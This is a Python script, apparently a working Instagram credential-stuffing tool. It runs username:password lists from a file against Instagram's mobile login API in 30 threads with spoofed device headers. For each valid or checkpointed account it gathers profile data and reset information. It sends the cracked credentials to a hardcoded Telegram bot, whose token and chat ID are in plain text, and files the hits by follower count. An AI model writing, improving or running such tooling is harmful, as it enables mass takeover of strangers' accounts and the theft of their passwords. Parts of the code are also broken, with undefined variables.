import os

try:
    import sys
    import re
    import json
    import uuid
    import time
    import string
    import random
    import warnings
    import urllib3
    import dns.resolver
    import requests
    from time import sleep
    from urllib.parse import quote
    from concurrent.futures import ThreadPoolExecutor
    from threading import Thread
    from requests import post
    from user_agent import generate_user_agent
    from ms4 import UserAgentGenerator
    from asmix import Instagram

except ImportError:
    os.system('pip3 install asmix')
    os.system('pip3 install user_agent')
    os.system('pip3 install requests')
    os.system('pip3 install ms4')
    os.system('pip3 install dnspython')
    os.system('pip3 install urllib3')
good = 0
secure = 0
bad_instagram = 0
bad_instagrams = 0
good_instagram = 0
good_email = 0
bad_email = 0





TELEGRAM_CHAT_ID = '1915006583'
TELEGRAM_TOKEN = '7830071436:AAGcfeJxlRFRbU9VewgBDlBcFR51vgKe7jQ'


def info(user5,ps):
    try:
        params = {'username': user5}
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Referer': "https://trendhero.io/instagram-follower-count/",
            'Accept-Language': "en-US,en;q=0.9"
        }

        for attempt in range(3):
            try:
                response = requests.get(
                    "https://trendhero.io/api/get_er_reports",
                    params=params,
                    headers=headers,
                    timeout=15
                )
                response.raise_for_status()
                data = response.json()
                break
            except Exception as e:
                if attempt == 2:
                    raise e
                time.sleep(2)

        user_info = data.get('preview', {}).get('user_info', {})
        user_id = user_info.get('id')

        if user_id and user_id.isdigit():
            user_id = int(user_id)
            if 1 < user_id <= 1278889:
                date = "2010"
            elif 1279000 <= user_id <= 17750000:
                date = "2011"
            elif 17750001 <= user_id <= 279760000:
                date = "2012"
            elif 279760001 <= user_id <= 900990000:
                date = "2013"
            elif 900990001 <= user_id <= 1629010000:
                date = "2014"
            elif 1629010001 <= user_id <= 2369359761:
                date = "2015"
            elif 2369359762 <= user_id <= 4239516754:
                date = "2016"
            elif 4239516755 <= user_id <= 6345108209:
                date = "2017"
            elif 6345108210 <= user_id <= 10016232395:
                date = "2018"
            elif 10016232396 <= user_id <= 27238602159:
                date = "2019"
            elif 27238602160 <= user_id <= 43464475395:
                date = "2020"
            elif 43464475396 <= user_id <= 50289297647:
                date = "2021"
            elif 50289297648 <= user_id <= 57464707082:
                date = "2022"
            elif 57464707083 <= user_id <= 63313426938:
                date = "2023"
            else:
                date = "2024+"
        else:
            date = "Unknown"

        full_name = user_info.get('full_name', 'N/A')
        followers = user_info.get('follower_count', 'N/A')
        following = user_info.get('following_count', 'N/A')
        posts = user_info.get('media_count', 'N/A')
        try:
            reset_info = Instagram.rest(user5)
        except:
            reset_info = "N/A"

        def escape_markdown_v2(text):
            special_chars = r"_*[]()~`>#+-=|{}.!"
            return ''.join(f"\\{c}" if c in special_chars else c for c in str(text))

        message = f"""
📌 *New Hit After : {many_check}*  
━━━━━━━━━━━━━━━  
🔄 *Status* : {status}
━━━━━━━━━━━━━━━  

📌 *User & Password*  
━━━━━━━━━━━━━━━  
👤 *User* : `{escape_markdown_v2(user5)}` 
🔑 *Password* : `{escape_markdown_v2(ps)}`  
━━━━━━━━━━━━━━━ 
📌 *Instagram Info*  
 ━━━━━━━━━━━━━━━ 
📛 *Name*: `{escape_markdown_v2(full_name)}`  
🖼 *Posts*: `{escape_markdown_v2(str(posts))}`  
📅 *Date*: `{escape_markdown_v2(date)}`  
👥 *Followers*: `{escape_markdown_v2(str(followers))}`  
🔄 *Following*: `{escape_markdown_v2(str(following))}`  
🔑 *Reset*: `{escape_markdown_v2(reset_info)}` 
━━━━━━━━━━━━━━━ 
💡 *By*: @BJRRR  
"""
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage?chat_id={TELEGRAM_CHAT_ID}&text=" + str(message))
        message1 = f"""


📌 New Hit
━━━━━━━━━━━━━━━  
🔄 Status : {status}
━━━━━━━━━━━━━━━  

📌 User & Password
━━━━━━━━━━━━━━━  
👤 User : {user5}
🔑 Password : {ps}
━━━━━━━━━━━━━━━ 

📌 Instagram Info  
━━━━━━━━━━━━━━━  
👤 User: {user5}  
📛 Name: {full_name}  
🖼 Posts: {posts}  
📅 Date: {date}  
👥 Followers: {followers}  
🔄 Following: {following}  
🔑 Reset: {reset_info}  
━━━━━━━━━━━━━━━  
💡 By: @BJRRR
"""

        if 0 <= followers <= 99:
            with open('account_save_0-99.txt', 'a', encoding='utf-8') as kal:
                kal.write(message1 + '\n')
        elif 100 <= followers <= 199:
            with open('account_save_100-199.txt', 'a', encoding='utf-8') as kal:
                kal.write(message1 + '\n')
        elif 200 <= followers <= 299:
            with open('account_save_200-299.txt', 'a', encoding='utf-8') as kal:
                kal.write(message1 + '\n')

        elif 300 <= followers <= 399:
            with open('account_save_300-399.txt', 'a', encoding='utf-8') as kal:
                kal.write(message1 + '\n')

        elif 400 <= followers <= 499:
            with open('account_save_400-499.txt', 'a', encoding='utf-8') as kal:
                    kal.write(message1 + '\n')

        elif 500 <= followers <= 599:
            with open('account_save_500-599.txt', 'a', encoding='utf-8') as kal:
                kal.write(message1 + '\n')

        elif 600 <= followers <= 999:
            with open('account_save_600-999.txt', 'a', encoding='utf-8') as kal:
                kal.write(message1 + '\n')
        else:
            with open('account_save_+999.txt', 'a', encoding='utf-8') as kal:
                kal.write(message1 + '\n')
    except Exception as e:

        try:
            error_msg = f"⚠️ Error checking @{user}: {str(e)}"
            telegram_ip = "149.154.167.220"  # One of Telegram's IPs
            headers = {"Host": "api.telegram.org"}
            url = f"https://{telegram_ip}/bot{TELEGRAM_TOKEN}/sendMessage"
            response = requests.post(
                url,
                headers=headers,
                json={
                    "chat_id": ID,
                    "text": escape_markdown_v2(error_msg),
                    "parse_mode": "MarkdownV2"
                },
                verify=False,
                timeout=10
            )

        except Exception as ex:

            print("Telegram error fallback failed:", str(ex))

        return False

def login(user5, ps):
    global good, secure , bad_instagram,status

    url = "https://i.instagram.com/api/v1/accounts/login/"

    payload = {
        "username": user5,
        "password": ps,
        "device_id": str(uuid.uuid4()),
        'from_reg': 'false',
        '_csrftoken': 'missing',
        'login_attempt_count': '0'
    }

    headers = {
        'User-Agent': "Instagram 113.0.0.39.122 Android (30/11; 320dpi; 720x1339; realme; RMX3261; RMX3261; S19610AA1; en_CA)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Cookie2': "$Version=1",
        'Accept-Language': "en-CA, en-US",
        'X-IG-Connection-Type': "WIFI",
        'X-IG-Capabilities': "AQ==",
        'Cookie': "mid=Z1X1aQABAAEAq4toJ71ehSMDn2Pq; csrftoken=soBcOp1Fev1JzR9iyqMZjlThIjdRZROn"
    }

    res = requests.post(url, data=payload, headers=headers).text
    data = json.loads(res)



    if 'checkpoint_challenge_required' in res:
        secure += 1
        status = 'Secure 🔑'
        info(user5, ps)
    elif 'logged_in_user' in res:
        good += 1
        status = 'Good ✅'
        user5 = data["logged_in_user"]["username"]
        info(user5, ps)
    elif 'logout' in res:
        secure += 1
        status = 'Secure 🔑'
    elif 'years old to have an account' in res:
        secure += 1
        status = 'Secure 🔑'
    elif 'UserInvalidCredentials' in res:
        bad_instagram += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
        ----- Instagram -----
        Hits : {good}
        Secure : {secure}
        Bad Insta : {bad_instagram}
        ----- Available -----
        Good Insta : {good_instagram}
        Bad Insta : {bad_instagrams}
        Good Email : {good_email}
        Bad Email : {bad_email}
        ''')
    elif 'bad_password' in res:
        bad_instagram += 1
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
        ----- Instagram -----
        Hits : {good}
        Secure : {secure}
        Bad Insta : {bad_instagram}
        ----- Available -----
        Good Insta : {good_instagram}
        Bad Insta : {bad_instagrams}
        Good Email : {good_email}
        Bad Email : {bad_email}
        ''')

def namefile():
    try:
        with open("kal.txt", "r", encoding='utf-8') as f:
            lines = f.readlines()

        with ThreadPoolExecutor(max_workers=30) as Ee:
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                if ':' in line:
                    user5, ps = line.split(':', 1)
                else:
                    user5 = line
                    ps = user5

                Ee.submit(login,user5, ps)

    except Exception as e:
        print(f"ERROR IN NAME: {e}")

namefile()
